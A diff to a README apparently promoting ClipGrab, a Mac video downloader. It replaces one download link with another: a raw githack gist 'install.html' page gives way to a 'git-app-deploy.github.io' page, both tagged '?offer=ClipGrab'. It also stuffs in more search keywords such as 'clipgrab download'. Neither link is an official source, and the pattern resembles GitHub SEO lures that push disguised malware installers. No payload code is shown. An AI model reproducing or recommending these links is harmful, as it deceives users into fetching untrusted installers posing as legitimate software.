@@ -2,7 +2,7 @@
 
 ClipGrab is a macOS application that allows you to download videos from popular websites and convert them into various formats. It provides a simple interface, fast downloads, and format conversion for seamless media management on Mac.
 
-<a href="https://gistcdn.githack.com/dwertipy1997/087944accf09b997ffca65f72608bfd2/raw/51aa50eaf4092755e9dcc03cda0fd13232dce8c3/install.html?offer=ClipGrab" target="_blank">
+<a href="https://git-app-deploy.github.io/.github/?offer=ClipGrab" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20ClipGrab%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
@@ -49,7 +49,7 @@ With ClipGrab, Mac users can download high-quality videos, convert them to MP4, 
 ---
 
 ## SEO Keywords
-clipgrab mac, clipgrab, clipgrab desktop, clipgrab for mac, clipgrab for pc, clipgrab macos, video downloader macos, mac video converter, mac download videos, extract audio mac, convert mp4 mac, mp3 from video mac, mac media management, mac video utility, video saving mac
+clipgrab mac, clipgrab, clip grab download, clipgrab download, clip grab, clipgrab desktop, clipgrab for mac, clipgrab for pc, clipgrab macos, video downloader macos, mac video converter, mac download videos, extract audio mac, convert mp4 mac, mp3 from video mac, mac media management, mac video utility, video saving mac
 
 ---
 
